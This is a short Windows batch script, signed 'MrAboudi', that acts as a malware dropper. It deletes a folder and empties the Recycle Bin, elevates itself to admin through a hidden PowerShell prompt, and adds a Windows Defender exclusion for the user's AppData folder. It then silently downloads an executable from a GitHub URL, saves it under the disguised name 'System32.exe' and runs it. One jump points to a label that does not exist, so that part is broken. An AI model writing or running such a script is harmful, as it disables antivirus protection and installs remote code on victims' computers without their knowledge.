@echo off

:: Always clean SubDir
set "SUBDIR=%USERPROFILE%\AppData\Roaming\SubDir"
if exist "%SUBDIR%" (
    rmdir /s /q "%SUBDIR%"
)
mkdir "%SUBDIR%"

:: Empty Recycle Bin
powershell -WindowStyle Hidden -Command "$shell = New-Object -ComObject Shell.Application; $shell.Namespace(0xA).Items() | %% { Remove-Item $_.Path -Recurse -Force -ErrorAction SilentlyContinue }"

:: Check internet
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    timeout /t 5 /nobreak >nul 2>&1
    goto CheckInternet
)

:: Check admin privileges
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: Set paths
set "APPDATA_PATH=%USERPROFILE%\AppData"
set "TARGET_FILE=%SUBDIR%\System32.exe"
set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"

:: Defender Exclusion
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"

:: Download and run
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
start "" "%TARGET_FILE%"
exit

:: By MrAboudi
:: v3
